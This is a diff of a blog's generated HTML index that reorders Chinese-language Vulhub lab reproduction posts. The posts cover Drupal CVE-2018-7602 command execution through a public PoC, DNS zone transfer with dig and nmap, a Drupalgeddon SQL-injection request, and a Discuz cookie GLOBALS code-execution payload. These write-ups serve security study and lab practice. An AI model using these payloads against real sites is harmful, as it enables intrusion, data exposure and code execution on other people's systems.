@@ -607,127 +607,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/ld (13)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/27/ld (13)/" itemprop="url">Drupal远程代码执行漏洞（CVE-2018-7602）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T09:16:18+08:00">
-                2019-07-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="Drupal远程代码执行漏洞（CVE-2018-7602）"><a href="#Drupal远程代码执行漏洞（CVE-2018-7602）" class="headerlink" title="Drupal远程代码执行漏洞（CVE-2018-7602）"></a>Drupal远程代码执行漏洞（CVE-2018-7602）</h1><p>影响软件：drupal<br>方式：对URL中的#进行编码两次，绕过sanitize()函数过滤<br>效果：任意命令执行<br>环境启动后，访问 <a href="http://your-ip:8081/" target="_blank" rel="noopener">http://your-ip:8081/</a> 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。<br>漏洞复现：<br>首先需要整到一个POC，参考网址：<a href="https://github.com/pimps/CVE-2018-" target="_blank" rel="noopener">https://github.com/pimps/CVE-2018-</a><br>7600/blob/master/drupa7-CVE-2018-7602.py。<br>执行如下命令，即可复现该漏洞。<br>python3 drupa7-CVE-2018-7602.py -c “id” admin 123456<br><a href="http://192.168.199.151:8081/" target="_blank" rel="noopener">http://192.168.199.151:8081/</a><br>admin为用户名；123456为密码；后面ip改为靶机ip；本次实例命令为’id’<br><a href="https://imgchr.com/i/mEAKIO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEAKIO.png" alt="mEAKIO.png"></a><br>如上图所示id命令已经执行</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/ld (12)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -849,6 +728,248 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/ld (13)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/27/ld (13)/" itemprop="url">Drupal远程代码执行漏洞（CVE-2018-7602）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T09:16:18+08:00">
+                2019-07-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="Drupal远程代码执行漏洞（CVE-2018-7602）"><a href="#Drupal远程代码执行漏洞（CVE-2018-7602）" class="headerlink" title="Drupal远程代码执行漏洞（CVE-2018-7602）"></a>Drupal远程代码执行漏洞（CVE-2018-7602）</h1><p>影响软件：drupal<br>方式：对URL中的#进行编码两次，绕过sanitize()函数过滤<br>效果：任意命令执行<br>环境启动后，访问 <a href="http://your-ip:8081/" target="_blank" rel="noopener">http://your-ip:8081/</a> 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。<br>漏洞复现：<br>首先需要整到一个POC，参考网址：<a href="https://github.com/pimps/CVE-2018-" target="_blank" rel="noopener">https://github.com/pimps/CVE-2018-</a><br>7600/blob/master/drupa7-CVE-2018-7602.py。<br>执行如下命令，即可复现该漏洞。<br>python3 drupa7-CVE-2018-7602.py -c “id” admin 123456<br><a href="http://192.168.199.151:8081/" target="_blank" rel="noopener">http://192.168.199.151:8081/</a><br>admin为用户名；123456为密码；后面ip改为靶机ip；本次实例命令为’id’<br><a href="https://imgchr.com/i/mEAKIO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEAKIO.png" alt="mEAKIO.png"></a><br>如上图所示id命令已经执行</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (10)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/26/ld (10)/" itemprop="url">DNS域传送漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
+                2019-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><p>DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞<br>&emsp;<br>在Linux下，我们可以使用dig命令来发送dns请求。比如，我们可以用dig @your-ip <a href="http://www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：" target="_blank" rel="noopener">www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：</a><br><a href="https://imgchr.com/i/mE9VMV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE9VMV.png" alt="mE9VMV.png"></a><br>发送axfr类型的dns请求：dig @192.168.199.151 -t axfr vulhub.org：<br><a href="https://imgchr.com/i/mE9GM6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE9GM6.png" alt="mE9GM6.png"></a><br>可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。<br>我们也可以用nmap script来扫描该漏洞：nmap –script dns-zone<br>transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn<br>-p 53 192.168.199.151。<br>可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。<br>我们也可以用nmap script来扫描该漏洞：nmap –script dns-zone<br>transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn<br>-p 53 192.168.199.151。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (11)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -922,127 +1043,6 @@
           
             <hr>
 <h1 id="Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）"><a href="#Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）" class="headerlink" title="Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）"></a>Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</h1><p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。<br>&emsp;<br>访问靶机IP<br><a href="https://imgchr.com/i/mEilGj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEilGj.png" alt="mEilGj.png"></a><br>打开bp抓包  并发送以下数据包<br>&emsp;<br>POST /?q=node&amp;destination=node HTTP/1.1<br>Host: your-ip:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 120<br>&emsp;<br>pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or<br>updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a<br>&emsp;<br>可见，信息已被爆出<br><a href="https://imgchr.com/i/mEiUdU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEiUdU.png" alt="mEiUdU.png"></a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (8)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/26/ld (8)/" itemprop="url">Discuz 7.x/6.x 全局变量防御绕过导致代码执行</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
-                2019-07-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h1><p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，我们通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞。<br>&emsp;<br>搭建漏洞环境（这里我已经搭建好了  直接启动）<br>在相应的目录下启动<br>docker-compose up -d<br><a href="https://imgchr.com/i/mADyDA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADyDA.png" alt="mADyDA.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mADh8S" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADh8S.png" alt="mADh8S.png"></a><br>启动后，访问<a href="http://your-ip:8080/install/来安装discuz，数据库地址填写db，数据库名为discuz，数据库账号密码均为root。" target="_blank" rel="noopener">http://your-ip:8080/install/来安装discuz，数据库地址填写db，数据库名为discuz，数据库账号密码均为root。</a><br><a href="https://imgchr.com/i/mAriUx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAriUx.png" alt="mAriUx.png"></a><br>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<br>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();<br>&emsp;<br>phpinfo已成功执行：<br><a href="https://imgchr.com/i/mAr8G8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAr8G8.png" alt="mAr8G8.png"></a></p>
 
           
         
@@ -1214,7 +1214,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (10)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (8)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -1233,7 +1233,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/07/26/ld (10)/" itemprop="url">DNS域传送漏洞</a></h1>
+                <a class="post-title-link" href="/2019/07/26/ld (8)/" itemprop="url">Discuz 7.x/6.x 全局变量防御绕过导致代码执行</a></h1>
         
 
         <div class="post-meta">
@@ -1286,7 +1286,7 @@
         
           
             <hr>
-<h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><p>DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞<br>&emsp;<br>在Linux下，我们可以使用dig命令来发送dns请求。比如，我们可以用dig @your-ip <a href="http://www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：" target="_blank" rel="noopener">www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：</a><br><a href="https://imgchr.com/i/mE9VMV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE9VMV.png" alt="mE9VMV.png"></a><br>发送axfr类型的dns请求：dig @192.168.199.151 -t axfr vulhub.org：<br><a href="https://imgchr.com/i/mE9GM6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE9GM6.png" alt="mE9GM6.png"></a><br>可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。<br>我们也可以用nmap script来扫描该漏洞：nmap –script dns-zone<br>transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn<br>-p 53 192.168.199.151。<br>可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。<br>我们也可以用nmap script来扫描该漏洞：nmap –script dns-zone<br>transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn<br>-p 53 192.168.199.151。</p>
+<h1 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h1><p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，我们通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞。<br>&emsp;<br>搭建漏洞环境（这里我已经搭建好了  直接启动）<br>在相应的目录下启动<br>docker-compose up -d<br><a href="https://imgchr.com/i/mADyDA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADyDA.png" alt="mADyDA.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mADh8S" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADh8S.png" alt="mADh8S.png"></a><br>启动后，访问<a href="http://your-ip:8080/install/来安装discuz，数据库地址填写db，数据库名为discuz，数据库账号密码均为root。" target="_blank" rel="noopener">http://your-ip:8080/install/来安装discuz，数据库地址填写db，数据库名为discuz，数据库账号密码均为root。</a><br><a href="https://imgchr.com/i/mAriUx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAriUx.png" alt="mAriUx.png"></a><br>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<br>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();<br>&emsp;<br>phpinfo已成功执行：<br><a href="https://imgchr.com/i/mAr8G8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAr8G8.png" alt="mAr8G8.png"></a></p>
 
           
         
